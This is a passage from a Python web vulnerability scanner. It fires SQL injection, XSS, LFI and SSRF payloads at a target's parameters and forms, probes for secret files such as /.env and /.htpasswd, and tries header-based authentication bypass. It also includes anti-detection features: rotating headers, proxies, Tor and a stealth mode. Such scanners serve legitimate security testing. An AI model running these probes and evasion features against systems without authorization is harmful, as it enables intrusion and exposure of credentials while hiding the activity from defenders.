                                        context_analysis['confidence'] * 0.6 +
                                        verification['confidence'] * 0.4
                                    )
                                    
                                    if combined_confidence > 0.7 and verification['vulnerable']:
                                        self.report_vulnerability(
                                            vuln_type=f"SQL Injection - Form {technique.replace('_', ' ').title()}",
                                            level="High",
                                            url=form['action'],
                                            parameter=input_field['name'],
                                            proof=f"Verified with {verification['techniques_confirmed']} techniques. Confidence: {combined_confidence:.2%}",
                                            recommendation="Implement server-side input validation",
                                            confidence=combined_confidence
                                        )
                                        
                            except Exception as e:
                                logging.debug(f"SQLi form test failed: {e}")

    def test_xss_Hafourenai(self):
        """Hafourenai XSS testing dengan context awareness"""
        logging.info("Testing XSS with context analysis...")
        
        # URL Parameter XSS with Context Detection
        for url in list(self.visited_urls):
            parsed = urlparse(url)
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                
                for param_name in params.keys():
                    for payload_type, payloads in self.xss_payloads.items():
                        for payload in payloads[:2]:
                            try:
                                test_params = {k: v[0] for k, v in params.items()}
                                test_params[param_name] = payload
                                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                                
                                response = self.safe_request('get', test_url,
                                    params=test_params,
                                    headers=self.rotate_headers_Hafourenai(),
                                    timeout=10
                                )
                                if not response:
                                    continue
                                
                                # Context-aware analysis
                                context_analysis = self.context_analyzer.analyze_xss_context(response.text, payload)
                                
                                # Automated verification
                                verification = self.verifier.verify_xss_with_multiple_vectors(
                                    test_url, param_name, test_params, 'get'
                                )
                                
                                combined_confidence = (
                                    context_analysis['confidence'] * 0.6 +
                                    verification['confidence'] * 0.4
                                )
                                
                                if combined_confidence > 0.7 and verification['vulnerable']:
                                    context_info = ', '.join(verification.get('contexts', []))
                                    self.report_vulnerability(
                                        vuln_type=f"XSS - Reflected ({payload_type}, Context: {context_info})",
                                        level="Medium",
                                        url=test_url + '?' + urllib.parse.urlencode(test_params),
                                        parameter=param_name,
                                        proof=f"Verified in {verification['vectors_confirmed']} contexts. Confidence: {combined_confidence:.2%}",
                                        recommendation="Implement output encoding and Content Security Policy",
                                        confidence=combined_confidence
                                    )
                                    
                            except Exception as e:
                                logging.debug(f"XSS URL test failed: {e}")

        # Form-based XSS with Verification
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name'] and input_field['type'] in ['text', 'search', 'textarea', 'url']:
                    for payload_type, payloads in self.xss_payloads.items():
                        for payload in payloads[:2]:
                            try:
                                data = {}
                                for field in form['inputs']:
                                    if field['name']:
                                        if field['name'] == input_field['name']:
                                            data[field['name']] = payload
                                        else:
                                            data[field['name']] = field['value'] or 'test'
                                
                                self.smart_delay_Hafourenai()
                                
                                if form['method'] == 'post':
                                    response = self.safe_request('post', form['action'],
                                        data=data,
                                        headers=self.rotate_headers_Hafourenai(),
                                        timeout=10
                                    )
                                else:
                                    response = self.safe_request('get', form['action'],
                                        params=data,
                                        headers=self.rotate_headers_Hafourenai(),
                                        timeout=10
                                    )
                                
                                if not response:
                                    continue
                                
                                context_analysis = self.context_analyzer.analyze_xss_context(response.text, payload)
                                verification = self.verifier.verify_xss_with_multiple_vectors(
                                    form['action'], input_field['name'], data, form['method']
                                )
                                
                                combined_confidence = (
                                    context_analysis['confidence'] * 0.6 +
                                    verification['confidence'] * 0.4
                                )
                                
                                if combined_confidence > 0.7 and verification['vulnerable']:
                                    self.report_vulnerability(
                                        vuln_type=f"XSS - Form ({payload_type})",
                                        level="Medium",
                                        url=form['action'],
                                        parameter=input_field['name'],
                                        proof=f"Context-aware XSS verified. Confidence: {combined_confidence:.2%}",
                                        recommendation="Implement input validation and output encoding",
                                        confidence=combined_confidence
                                    )
                                    
                            except Exception as e:
                                logging.debug(f"XSS form test failed: {e}")

    def test_lfi_Hafourenai(self):
        """Hafourenai LFI testing dengan context validation"""
        logging.info("Testing Local File Inclusion with verification...")
        
        for url in list(self.visited_urls)[:30]:
            parsed = urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            for param_name, param_values in query_params.items():
                if any(skip in param_name.lower() for skip in ['callback', 'jsonp', 'function']):
                    continue
                    
                for payload in self.lfi_payloads[:5]:  # Test top 5 payloads
                    try:
                        test_params = {k: v[0] for k, v in query_params.items()}
                        test_params[param_name] = payload
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        response = self.safe_request('get', test_url,
                            params=test_params,
                            headers=self.rotate_headers_Hafourenai(),
                            timeout=10
                        )
                        if not response:
                            continue
                        
                        # Context-aware LFI detection
                        context_analysis = self.context_analyzer.analyze_lfi_context(response.text, payload)
                        
                        # Automated multi-file verification
                        verification = self.verifier.verify_lfi_with_multiple_files(
                            test_url, param_name, test_params
                        )
                        
                        combined_confidence = (
                            context_analysis['confidence'] * 0.5 +
                            verification['confidence'] * 0.5
                        )
                        
                        if combined_confidence > 0.7 and verification['vulnerable']:
                            evidence_text = '\n'.join(context_analysis.get('evidence', []))
                            self.report_vulnerability(
                                vuln_type="Local File Inclusion (LFI) - Verified",
                                level="High",
                                url=test_url + '?' + urllib.parse.urlencode(test_params),
                                parameter=param_name,
                                proof=f"Multi-file verification: {verification['files_confirmed']} files. Evidence: {evidence_text}. Confidence: {combined_confidence:.2%}",
                                recommendation="Validate and sanitize file path inputs",
                                confidence=combined_confidence
                            )
                                
                    except Exception as e:
                        logging.debug(f"LFI test failed: {e}")

    def test_ssrf(self):
        """SSRF testing dengan behavioral detection"""
        logging.info("Testing Server-Side Request Forgery...")
        
        ssrf_indicators = [
            '22/tcp', '3306', 'Connection refused', 'ECONNREFUSED',
            'Internal Server', 'localhost', '127.0.0.1',
            'aws.internal', 'metadata.google.internal'
        ]
        
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['type'] in ['url', 'text'] and any(keyword in input_field['name'].lower() for keyword in ['url', 'link', 'image', 'file', 'endpoint']):
                    for payload in self.ssrf_payloads:
                        try:
                            data = {}
                            for field in form['inputs']:
                                if field['name']:
                                    if field['name'] == input_field['name']:
                                        data[field['name']] = payload
                                    else:
                                        data[field['name']] = field['value'] or 'test'
                            
                            self.smart_delay_Hafourenai()
                            
                            if form['method'] == 'post':
                                response = self.safe_request('post', form['action'],
                                    data=data,
                                    headers=self.rotate_headers_Hafourenai(),
                                    timeout=15
                                )
                            else:
                                response = self.safe_request('get', form['action'],
                                    params=data,
                                    headers=self.rotate_headers_Hafourenai(),
                                    timeout=15
                                )
                            
                            if not response:
                                continue
                            
                            # Check for SSRF indicators
                            for indicator in ssrf_indicators:
                                if indicator in response.text:
                                    self.report_vulnerability(
                                        vuln_type="Server-Side Request Forgery (SSRF)",
                                        level="High",
                                        url=form['action'],
                                        parameter=input_field['name'],
                                        proof=f"SSRF indicator found: {indicator}",
                                        recommendation="Validate and whitelist allowed URLs",
                                        confidence=0.8
                                    )
                                    break
                                    
                        except Exception as e:
                            logging.debug(f"SSRF test failed: {e}")

    def test_csrf(self):
        """Advanced CSRF detection dengan multi‑layer analysis & active tests."""
        logging.info("Testing CSRF vulnerabilities (advanced)...")

        for form in self.forms:
            try:
                # Ambil HTML halaman asal form untuk analisa CAPTCHA, dll.
                page_html = ""
                if form.get("url"):
                    resp = self.safe_request(
                        "get",
                        form["url"],
                        headers=self.rotate_headers_Hafourenai(),
                        timeout=10,
                    )
                    if resp:
                        page_html = resp.text

                analysis = self.csrf_detector.analyze_form(form, page_html)

                if not analysis["vulnerable"]:
                    continue

                confidence = analysis.get("confidence", 0.0)
                # Hanya report jika confidence cukup tinggi
                if confidence < 0.7:
                    continue

                # Tentukan level berdasarkan sensitivitas field
                inputs = form.get("inputs", [])
                names = " ".join((i.get("name", "") or "").lower() for i in inputs)

                critical = ["password", "credit", "card", "payment", "transfer", "delete_account", "iban"]
                high = ["profile", "settings", "email", "update", "change", "phone"]

                if any(k in names for k in critical):
                    level = "Critical"
                elif any(k in names for k in high):
                    level = "High"
                else:
                    level = "Medium"

                tests_success = [t["name"] for t in analysis.get("tests", []) if t.get("success")]

                proof_lines = []
                if analysis["evidence"].get("tokens", {}).get("found") is False:
                    proof_lines.append("No CSRF token detected in form fields.")
                if not analysis["evidence"].get("samesite", {}).get("protected"):
                    proof_lines.append("Session cookies without SameSite protection.")
                if tests_success:
                    proof_lines.append(f"Active CSRF tests accepted: {', '.join(tests_success)}")

                proof_text = " ".join(proof_lines) or "Form appears to accept state‑changing requests without proper CSRF protection."

                self.report_vulnerability(
                    vuln_type="Cross-Site Request Forgery (CSRF)",
                    level=level,
                    url=form.get("url", self.target_url),
                    parameter=form.get("action", "form_action"),
                    proof=proof_text,
                    recommendation="Implement strong CSRF protection: secure per‑session tokens, SameSite cookies, and Origin/Referer validation.",
                    confidence=confidence,
                )

            except Exception as e:
                logging.debug(f"Advanced CSRF test failed: {e}")

    def test_security_headers(self):
        """Comprehensive security headers analysis"""
        logging.info("Testing security headers...")
        
        security_checks = {
            'X-Frame-Options': {
                'required': True,
                'values': ['DENY', 'SAMEORIGIN'],
                'risk': 'Clickjacking'
            },
            'X-Content-Type-Options': {
                'required': True, 
                'values': ['nosniff'],
                'risk': 'MIME sniffing'
            },
            'X-XSS-Protection': {
                'required': True,
                'values': ['1; mode=block'],
                'risk': 'XSS protection'
            },
            'Strict-Transport-Security': {
                'required': False,
                'values': ['max-age='],
                'risk': 'HTTPS enforcement'
            },
            'Content-Security-Policy': {
                'required': False,
                'values': [],
                'risk': 'Content injection'
            },
            'Referrer-Policy': {
                'required': False,
                'values': ['no-referrer', 'strict-origin'],
                'risk': 'Referrer leakage'
            }
        }
        
        for url in list(self.visited_urls)[:15]:
            try:
                response = self.safe_request('get', url, headers=self.rotate_headers_Hafourenai(), timeout=10)
                if not response:
                    continue
                    
                headers = response.headers
                
                for header, config in security_checks.items():
                    if header not in headers and config['required']:
                        self.report_vulnerability(
                            vuln_type="Security Misconfiguration",
                            level="Low",
                            url=url,
                            parameter=f"Missing {header}",
                            proof=f"Security header {header} not implemented",
                            recommendation=f"Implement {header} header to prevent {config['risk']}",
                            confidence=0.95
                        )
                            
            except Exception as e:
                logging.debug(f"Header test failed: {e}")

    def test_sensitive_data_exposure(self):
        """Hafourenai sensitive data detection"""
        logging.info("Testing for sensitive data exposure...")
        
        sensitive_files = [
            '/.env', '/.git/config', '/backup.zip', '/database.sql',
            '/wp-config.php', '/config.php', '/configuration.php',
            '/web.config', '/.htpasswd', '/phpinfo.php', '/test.php'
        ]
        
        for sensitive_file in sensitive_files:
            test_url = urljoin(self.target_url, sensitive_file)
            try:
                response = self.safe_request('get', test_url,
                    headers=self.rotate_headers_Hafourenai(),
                    timeout=10
                )
                
                if response and response.status_code == 200:
                    sensitive_indicators = [
                        ('DB_PASSWORD', 'Database password'),
                        ('API_KEY', 'API key'),
                        ('SECRET_KEY', 'Secret key'),
                        ('database_host', 'Database host'),
                        ('aws_secret', 'AWS secret'),
                    ]
                    
                    for indicator, description in sensitive_indicators:
                        if indicator.lower() in response.text.lower():
                            self.report_vulnerability(
                                vuln_type="Sensitive Data Exposure",
                                level="High",
                                url=test_url,
                                parameter=description,
                                proof=f"Sensitive data found: {indicator}",
                                recommendation="Remove sensitive files from web root",
                                confidence=0.9
                            )
                            break
                            
            except Exception as e:
                logging.debug(f"Sensitive file test failed: {e}")

    def test_authentication_bypass(self):
        """Authentication bypass testing"""
        logging.info("Testing authentication bypass...")
        
        admin_paths = ['/admin', '/dashboard', '/cp', '/controlpanel']
        
        for admin_path in admin_paths:
            test_url = urljoin(self.target_url, admin_path)
            try:
                response = self.safe_request('get', test_url,
                    headers=self.rotate_headers_Hafourenai(),
                    timeout=10
                )
                
                if response and response.status_code == 200:
                    bypass_headers = [
                        {'X-Original-URL': admin_path},
                        {'X-Forwarded-For': '127.0.0.1'},
                    ]
                    
                    for headers in bypass_headers:
                        try:
                            bypass_response = self.safe_request('get', self.target_url,
                                headers={**self.rotate_headers_Hafourenai(), **headers},
                                timeout=10
                            )
                            
                            if bypass_response and bypass_response.status_code == 200:
                                self.report_vulnerability(
                                    vuln_type="Authentication Bypass",
                                    level="Critical",
                                    url=self.target_url,
                                    parameter="Header manipulation",
                                    proof=f"Admin accessible with headers: {headers}",
                                    recommendation="Implement proper authentication checks",
                                    confidence=0.85
                                )
                                break
                        except:
                            pass
                            
            except Exception as e:
                logging.debug(f"Auth bypass test failed: {e}")

    def Hafourenai_header_analysis(self, headers, url):
        """Comprehensive security headers analysis"""
        security_checks = {
            'X-Frame-Options': {'required': True, 'values': ['DENY', 'SAMEORIGIN']},
            'X-Content-Type-Options': {'required': True, 'values': ['nosniff']},
        }
        
        for header, config in security_checks.items():
            if header not in headers and config['required']:
                self.report_vulnerability(
                    vuln_type="Security Misconfiguration",
                    level="Low",
                    url=url,
                    parameter=f"Missing {header}",
                    proof=f"Security header {header} not implemented",
                    recommendation=f"Implement {header} header",
                    confidence=0.9
                )

    def content_analysis_Hafourenai(self, content, url):
        """Analyze content for sensitive information"""
        for pattern, description in self.sensitive_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches[:3]:
                if self.is_sensitive_match(match):
                    self.report_vulnerability(
                        vuln_type="Information Disclosure",
                        level="Low",
                        url=url,
                        parameter=description,
                        proof=f"Sensitive {description} found",
                        recommendation="Remove sensitive information",
                        confidence=0.75
                    )

    def is_sensitive_match(self, match):
        """Check if match is actually sensitive"""
        false_positives = ['example.com', 'test@test.com', '127.0.0.1']
        return match not in false_positives and len(match) > 3

    def report_vulnerability(self, vuln_type, level, url, parameter, proof, recommendation, confidence=0.8):
        """Professional vulnerability reporting with confidence scoring"""
        vulnerability = {
            'id': hashlib.md5(f"{vuln_type}{url}{parameter}{proof}".encode()).hexdigest()[:12],
            'type': vuln_type,
            'level': level,
            'url': url,
            'parameter': parameter,
            'proof': proof,
            'recommendation': recommendation,
            'confidence': confidence,
            'timestamp': datetime.now().isoformat(),
            'risk_score': self.calculate_risk_score(level, confidence)
        }
        
        # Avoid duplicates
        vuln_hash = hashlib.md5(f"{vuln_type}{url}{parameter}".encode()).hexdigest()
        for existing in self.vulnerabilities:
            existing_hash = hashlib.md5(f"{existing['type']}{existing['url']}{existing['parameter']}".encode()).hexdigest()
            if vuln_hash == existing_hash:
                return
        
        self.vulnerabilities.append(vulnerability)
        
        level_indicators = {
            'Critical': '[CRITICAL]',
            'High': '[HIGH]', 
            'Medium': '[MEDIUM]',
            'Low': '[LOW]'
        }
        
        indicator = level_indicators.get(level, '[INFO]')
        logging.warning(f"{indicator} {vuln_type} at {url} (Confidence: {confidence:.0%})")

    def calculate_risk_score(self, level, confidence):
        """Calculate risk score with confidence weighting"""
        base_scores = {'Critical': 10, 'High': 8, 'Medium': 5, 'Low': 2}
        return base_scores.get(level, 1) * confidence

    def generate_html_report(self, scan_time):
        """Generate professional HTML report"""
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Vulnerability Scan Report</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: #333;
                    line-height: 1.6;
                }}
                .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
                .header {{ 
                    background: white;
                    padding: 40px;
                    border-radius: 15px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                    text-align: center;
                    margin-bottom: 30px;
                }}
                .header h1 {{ color: #2c3e50; font-size: 2.5em; margin-bottom: 10px; }}
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }}
                .stat-card {{
                    background: white;
                    padding: 25px;
                    border-radius: 10px;
                    text-align: center;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                }}
                .stat-number {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }}
                .critical {{ color: #e74c3c; }}
                .high {{ color: #e67e22; }}
                .medium {{ color: #f39c12; }}
                .low {{ color: #27ae60; }}
                .vulnerability-section {{
                    background: white;
                    padding: 30px;
                    border-radius: 15px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                    margin-bottom: 30px;
                }}
                .vuln-item {{
                    background: #f8f9fa;
                    border-left: 5px solid #e74c3c;
                    padding: 20px;
                    margin-bottom: 15px;
                    border-radius: 5px;
                }}
                .confidence-badge {{
                    display: inline-block;
                    background: #3498db;
                    color: white;
                    padding: 5px 10px;
                    border-radius: 15px;
                    font-size: 0.85em;
                    margin-left: 10px;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Hafourenai Vulnerability Scan Report</h1>
                    <p> ML-Style Behavioral Analysis</p>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number critical">{len([v for v in self.vulnerabilities if v['level'] == 'Critical'])}</div>
                        <div>Critical</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number high">{len([v for v in self.vulnerabilities if v['level'] == 'High'])}</div>
                        <div>High</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number medium">{len([v for v in self.vulnerabilities if v['level'] == 'Medium'])}</div>
                        <div>Medium</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number low">{len([v for v in self.vulnerabilities if v['level'] == 'Low'])}</div>
                        <div>Low</div>
                    </div>
                </div>

                <div class="vulnerability-section">
                    <h2>Scan Information</h2>
                    <p><strong>Target:</strong> {self.target_url}</p>
                    <p><strong>Duration:</strong> {scan_time:.2f}s</p>
                    <p><strong>Pages Scanned:</strong> {len(self.visited_urls)}</p>
                </div>

                <div class="vulnerability-section">
                    <h2>Verified Vulnerabilities</h2>
                    {"".join(self._generate_vuln_html(v) for v in self.vulnerabilities)}
                </div>
            </div>
        </body>
        </html>
        """
        
        filename = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return filename

    def _generate_vuln_html(self, vuln):
        """Generate HTML for vulnerability"""
        return f"""
        <div class="vuln-item">
            <div class="vuln-title">
                {vuln['type']} - {vuln['level']}
                <span class="confidence-badge">Confidence: {vuln['confidence']:.0%}</span>
            </div>
            <p><strong>URL:</strong> {vuln['url']}</p>
            <p><strong>Parameter:</strong> {vuln['parameter']}</p>
            <p><strong>Proof:</strong> {html.escape(str(vuln['proof']))}</p>
            <p><strong>Recommendation:</strong> {vuln['recommendation']}</p>
        </div>
        """

    def run_scan(self):
        """Main scanning function"""
        start_time = time.time()
        
        print(f"\n{'='*60}")
        print("SCANNER STARTING...")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Mode: {'STEALTH' if self.stealth_mode else 'AGGRESSIVE' if self.aggressive_mode else 'BALANCED'}")
        print(f"Threads: {self.max_threads}")
        print(f"Depth: {self.crawl_depth}")
        
        # Phase 1: Discovery
        print(f"\n{'='*60}")
        print("PHASE 1: COMPREHENSIVE DISCOVERY")
        print(f"{'='*60}")
        self.crawl()
        print(f"Discovery: {len(self.visited_urls)} URLs")
        
        # Phase 2: Hafourenai Vulnerability Testing
        print(f"\n{'='*60}")
        print("PHASE 2: Hafourenai VULNERABILITY TESTING ")
        print(f"{'='*60}")
        
        test_methods = [
            self.test_sql_injection_Hafourenai,
            self.test_xss_Hafourenai,
            self.test_lfi_Hafourenai,
            self.test_ssrf,
            self.test_csrf,
            self.test_security_headers,
            self.test_sensitive_data_exposure,
            self.test_authentication_bypass
        ]
        
        with ThreadPoolExecutor(max_workers=min(self.max_threads, len(test_methods))) as executor:
            futures = {executor.submit(method): method.__name__ for method in test_methods}
            for future in as_completed(futures):
                try:
                    future.result()
                    print(f"   ✓ {futures[future].replace('test_', '').replace('_', ' ').title()} completed")
                except Exception as e:
                    logging.error(f"Test failed: {e}")
        
        # Phase 3: Reporting
        scan_time = time.time() - start_time
        self.generate_report(scan_time)
        
        return self.vulnerabilities

    def generate_report(self, scan_time):
        """Generate comprehensive report"""
        print(f"\n{'='*80}")
        print("Hafourenai VULNERABILITY SCAN REPORT")
        print(f"{'='*80}")
        
        print(f"\nSCAN STATISTICS:")
        print(f"   Target: {self.target_url}")
        print(f"   Duration: {scan_time:.2f}s")
        print(f"   URLs Scanned: {len(self.visited_urls)}")
        print(f"   Vulnerabilities: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            levels = {}
            for vuln in self.vulnerabilities:
                levels[vuln['level']] = levels.get(vuln['level'], 0) + 1
            
            print(f"\n   By Severity:")
            for level in ['Critical', 'High', 'Medium', 'Low']:
                if level in levels:
                    print(f"      {level}: {levels[level]}")
            
            # High confidence findings
            high_conf = [v for v in self.vulnerabilities if v['confidence'] > 0.8]
            print(f"\n   High Confidence Findings (>80%): {len(high_conf)}")
        
        report_file = self.generate_html_report(scan_time)
        print(f"\nFull HTML report: {report_file}")

def main():
    print("""
    \033[38;5;160m██╗  ██╗\033[38;5;161m ██████╗\033[38;5;162m ███╗   ██╗\033[38;5;163m███████╗\033[38;5;164m██╗   ██╗
    \033[38;5;165m██║  ██║\033[38;5;166m██╔═══██╗\033[38;5;167m████╗  ██║\033[38;5;168m██╔════╝\033[38;5;169m╚██╗ ██╔╝
    \033[38;5;170m███████║\033[38;5;171m██║   ██║\033[38;5;172m██╔██╗ ██║\033[38;5;173m█████╗   \033[38;5;174m╚████╔╝ 
    \033[38;5;175m██╔══██║\033[38;5;176m██║   ██║\033[38;5;177m██║╚██╗██║\033[38;5;178m██╔══╝    \033[38;5;179m╚██╔╝  
    \033[38;5;21m██║  ██║\033[38;5;20m╚██████╔╝\033[38;5;19m██║ ╚████║\033[38;5;18m███████╗  \033[38;5;17m ██║   
    \033[38;5;56m╚═╝  ╚═╝\033[38;5;55m ╚═════╝ \033[38;5;54m╚═╝  ╚═══╝\033[38;5;53m╚══════╝  \033[38;5;52m ╚═╝   
    \033[0m
""")
    print("\033[38;5;196m" + "═"*60 + "\033[0m")
    print("\033[1;38;5;200mHONEY Vulnerability Scanner\033[0m")
    print("\033[38;5;204m" + "═"*60 + "\033[0m")
    print("\033[38;5;208mAdvanced ML-Style Web Security Assessment Tool\033[0m")
    print("\033[38;5;212mWith Anti-Ban System & Behavioral Analysis\033[0m")
    print("\033[38;5;21m" + "═"*60 + "\033[0m\n")
   
    parser = argparse.ArgumentParser(description='Hafourenai Vulnerability Scanner with Anti-Ban')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=15, help='Threads')
    parser.add_argument('-d', '--depth', type=int, default=5, help='Crawl depth')
    parser.add_argument('--aggressive', action='store_true', help='Aggressive mode')
    parser.add_argument('--stealth', action='store_true', help='Stealth mode')
    
    # New arguments for anti-ban system
    parser.add_argument('--proxy-file', help='Proxy list file')
    parser.add_argument('--use-tor', action='store_true', help='Use TOR network')
    parser.add_argument('--rate', type=float, default=1.0, help='Requests per second')
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'http://' + args.target
    
    scanner = VulnScanner(
        target_url=args.target,
        max_threads=args.threads,
        crawl_depth=args.depth,
        stealth_mode=args.stealth,
        aggressive_mode=args.aggressive,
        proxy_file=args.proxy_file,
        use_tor=args.use_tor,
        rate_limit=args.rate
    )
    
    try:
        results = scanner.run_scan()
        print(f"\n{'='*60}")
        print(f"Scan completed: {len(results)} vulnerabilities found!")
        print(f"{'='*60}")
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
    except Exception as e:
        print(f"\nScan failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()